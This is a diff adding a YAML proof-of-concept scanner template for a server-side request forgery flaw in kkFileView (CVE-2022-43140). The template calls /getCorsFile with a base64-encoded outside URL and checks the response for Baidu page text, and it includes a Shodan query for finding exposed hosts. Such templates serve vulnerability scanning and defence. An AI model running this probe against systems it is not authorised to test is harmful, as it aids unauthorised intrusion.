@@ -1,0 +1,22 @@
+id: poc-yaml-kkfileview-getcorsfile-ssrf
+info:
+  name: kkFileView 服务器端请求伪造漏洞(CVE-2022-43140)
+  severity: high
+  tags:
+  - ssrf
+  - CVE-2022-43140
+  finger: kkfileview
+  shodan: http.html:"kkFileView"
+variables:
+  url: base64("https://www.baidu.com")
+requests:
+- method: GET
+  path: /getCorsFile?urlPath={{.url}}
+  expression: 'status_code == 200
+
+    && contains(body,"百度一下，你就知道")
+
+    && contains(body,"关于百度")
+
+    '
+transport: http
